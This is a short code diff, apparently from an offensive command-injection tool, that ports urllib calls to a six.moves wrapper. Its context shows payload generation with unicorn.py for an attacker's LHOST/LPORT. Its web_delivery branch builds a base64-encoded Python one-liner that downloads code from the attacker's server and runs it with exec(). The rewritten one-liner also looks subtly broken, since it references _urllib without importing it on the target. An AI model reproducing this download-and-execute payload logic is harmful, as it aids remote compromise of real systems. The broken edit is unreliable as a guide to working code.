@@ -17,7 +17,7 @@ import os
 import re
 import sys
 import time
-import urllib
+from src.thirdparty.six.moves import urllib as _urllib
 import base64
 import random
 import string
@@ -555,7 +555,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
                 subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
                 with open(output, 'r') as content_file:
                   other_shell = content_file.read().replace('\n', '')
-                other_shell = urllib.quote_plus(other_shell) 
+                other_shell = _urllib.parse.quote_plus(other_shell) 
                 print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
                 # Remove the ouput file
                 os.remove(output)
@@ -635,7 +635,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meter
                             "exploit\n\n")
 
           if web_delivery == '1':
-            data = "import urllib2; r=urllib2.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'); exec(r.read());"
+            data = "; r=_urllib.request.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'); exec(r.read());"
             data = base64.b64encode(data)
             if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
               set_python_working_dir()
